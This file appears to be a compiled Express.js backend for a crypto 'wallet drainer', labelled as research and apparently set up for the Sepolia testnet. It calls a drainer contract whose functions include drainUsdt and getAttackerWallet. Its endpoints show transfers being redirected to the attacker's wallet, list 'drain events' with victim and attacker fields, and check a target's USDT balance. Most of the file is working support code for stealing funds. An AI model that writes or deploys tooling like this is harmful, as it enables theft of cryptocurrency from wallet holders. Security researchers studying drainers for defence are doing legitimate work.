"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const dotenv_1 = __importDefault(require("dotenv"));
const ethers_1 = require("ethers");
dotenv_1.default.config();
const app = (0, express_1.default)();
const port = parseInt(process.env.PORT || '3001');
// Middleware
app.use((0, cors_1.default)());
app.use(express_1.default.json());
// Contract ABIs
const WALLET_DRAINER_ABI = [
    "function sendToFriend(address tokenAddress, address intendedRecipient, uint256 amount) external",
    "function drainUsdt(address tokenAddress) external",
    "function getAttackerWallet() external view returns (address)",
    "event FundsRedirected(address indexed from, address indexed to, uint256 amount)"
];
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)"
];
// Routes
app.get('/', (req, res) => {
    res.json({ message: 'Web3 Wallet Research Backend Running' });
});
// Contract information endpoint
app.get('/api/contract-info', async (req, res) => {
    try {
        // Connect to blockchain to get real-time attacker wallet
        //const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
        const provider = new ethers_1.ethers.JsonRpcProvider(process.env.RPC_URL);
        const contract = new ethers_1.ethers.Contract(process.env.CONTRACT_ADDRESS, WALLET_DRAINER_ABI, provider);
        const attackerWallet = await contract.getAttackerWallet();
        res.json({
            contractAddress: process.env.CONTRACT_ADDRESS,
            usdtAddress: process.env.USDT_ADDRESS,
            networkId: process.env.NETWORK_ID || '11155111',
            attackerWallet: attackerWallet
        });
    }
    catch (error) {
        console.error('Error getting contract info:', error);
        res.status(500).json({ error: 'Failed to get contract info' });
    }
});
// Transaction simulation endpoint
app.post('/api/simulate-transaction', async (req, res) => {
    const { from, to, amount, tokenAddress } = req.body;
    try {
        //const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
        const provider = new ethers_1.ethers.JsonRpcProvider(process.env.RPC_URL);
        const contract = new ethers_1.ethers.Contract(process.env.CONTRACT_ADDRESS, WALLET_DRAINER_ABI, provider);
        const actualRecipient = await contract.getAttackerWallet();
        res.json({
            intendedRecipient: to,
            actualRecipient: actualRecipient,
            amount: amount,
            tokenAddress: tokenAddress,
            contractAddress: process.env.CONTRACT_ADDRESS,
            warning: 'This transaction will redirect funds to the attacker wallet!',
            gasEstimate: 'User pays gas fees for their own wallet draining'
        });
    }
    catch (error) {
        console.error('Error simulating transaction:', error);
        res.status(500).json({ error: 'Simulation failed' });
    }
});
// Monitor draining events
app.get('/api/drain-events', async (req, res) => {
    try {
        //const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
        const provider = new ethers_1.ethers.JsonRpcProvider(process.env.RPC_URL);
        const contract = new ethers_1.ethers.Contract(process.env.CONTRACT_ADDRESS, WALLET_DRAINER_ABI, provider);
        // Get recent FundsRedirected events
        const filter = contract.filters.FundsRedirected();
        const events = await contract.queryFilter(filter, -100); // Last 100 blocks
        /*const drainEvents = events.map(event => ({
          victim: event.args?.from,
          attacker: event.args?.to,
          amount: ethers.utils.formatUnits(event.args?.amount || 0, 6), // Assuming USDT (6 decimals)
          blockNumber: event.blockNumber,
          transactionHash: event.transactionHash
        }));*/
        const drainEvents = events.map(event => {
            // only handle parsed EventLog objects that have `.args`
            if ('args' in event && event.args) {
                const args = event.args;
                const from = args.from ?? args[0] ?? null;
                const to = args.to ?? args[1] ?? null;
                const rawAmount = args.amount ?? args[2] ?? 0n;
                // normalize rawAmount (handles bigint, BigNumber-like objects, strings, etc.)
                let normalizedAmount = rawAmount;
                if (typeof rawAmount === 'object' && rawAmount !== null && typeof rawAmount.toString === 'function') {
                    normalizedAmount = rawAmount.toString();
                }
                return {
                    victim: from,
                    attacker: to,
                    amount: ethers_1.ethers.formatUnits(normalizedAmount, 6),
                    blockNumber: event.blockNumber,
                    transactionHash: event.transactionHash
                };
            }
            // fallback for unparsed Log objects
            return {
                victim: null,
                attacker: null,
                amount: '0',
                blockNumber: event.blockNumber,
                transactionHash: event.transactionHash
            };
        });
        res.json({ events: drainEvents });
    }
    catch (error) {
        console.error('Error getting drain events:', error);
        res.status(500).json({ error: 'Failed to get events' });
    }
});
// Balance check endpoint
app.post('/api/check-balance', async (req, res) => {
    const { userAddress } = req.body;
    try {
        //const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
        const provider = new ethers_1.ethers.JsonRpcProvider(process.env.RPC_URL);
        const usdtContract = new ethers_1.ethers.Contract(process.env.USDT_ADDRESS, ERC20_ABI, provider);
        const balance = await usdtContract.balanceOf(userAddress);
        const decimals = await usdtContract.decimals();
        const symbol = await usdtContract.symbol();
        // ensure decimals is a number (handle BigNumber/string/number)
        let decimalsNumber = Number(decimals);
        if (Number.isNaN(decimalsNumber))
            decimalsNumber = 6; // fallback to 6 if unexpected
        /*res.json({
            balance: ethers.utils.formatUnits(balance, decimals),
            symbol: symbol,
            raw: balance.toString()
        });*/
        res.json({
            // ethers v6: use ethers.formatUnits instead of ethers.utils.formatUnits
            balance: ethers_1.ethers.formatUnits(balance, decimalsNumber),
            symbol: symbol,
            raw: balance.toString()
        });
    }
    catch (error) {
        console.error('Error checking balance:', error);
        res.status(500).json({ error: 'Balance check failed' });
    }
});
app.listen(port, () => {
    console.log(`🚀 Research Backend running on http://localhost:${port}`);
    console.log(`📄 Contract: ${process.env.CONTRACT_ADDRESS}`);
    console.log(`💰 USDT: ${process.env.USDT_ADDRESS}`);
});
//# sourceMappingURL=index.js.map